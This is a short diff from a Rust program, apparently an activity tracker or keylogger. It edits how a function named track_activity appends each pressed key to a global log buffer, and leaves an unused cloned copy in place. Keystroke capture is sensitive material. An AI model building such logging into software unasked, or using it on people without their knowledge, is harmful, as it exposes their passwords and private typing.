@@ -230,7 +230,7 @@ fn track_activity(event: Event) {
         EventType::KeyPress(Key) => {
             let key = event.name.unwrap();
             let old = LOG_FILE.lock().unwrap().clone();
-            *LOG_FILE.lock().unwrap() = old + &key;
+            *LOG_FILE.lock().unwrap() += &key;
         },
         EventType::MouseMove{x, y} => (),
         _ => (),
